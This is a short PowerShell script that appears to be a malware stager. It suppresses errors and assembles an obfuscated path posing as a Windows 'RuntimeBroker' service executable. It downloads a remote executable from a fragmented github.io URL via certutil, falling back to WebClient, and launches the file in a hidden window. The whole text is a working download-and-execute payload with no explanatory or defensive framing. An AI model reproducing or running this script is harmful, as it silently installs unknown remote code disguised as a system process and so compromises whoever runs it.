$ErrorActionPreference='SilentlyContinue'
$a=$env:LOCALAPPDATA
$b='\Microsoft\Win'+'dows\Run'+'timeBro'+'ker_svc.exe'
$p=$a+$b
$h='https://fairytail5d'+'0.github.io/ab'+'obis/sync.exe'
& "$env:SystemRoot\System32\certutil.exe" -urlcache -split -f $h $p | Out-Null
if(-not(Test-Path $p)){
    (New-Object System.Net.WebClient).DownloadFile($h,$p)
}
if(Test-Path $p){Start-Process $p -WindowStyle Hidden}
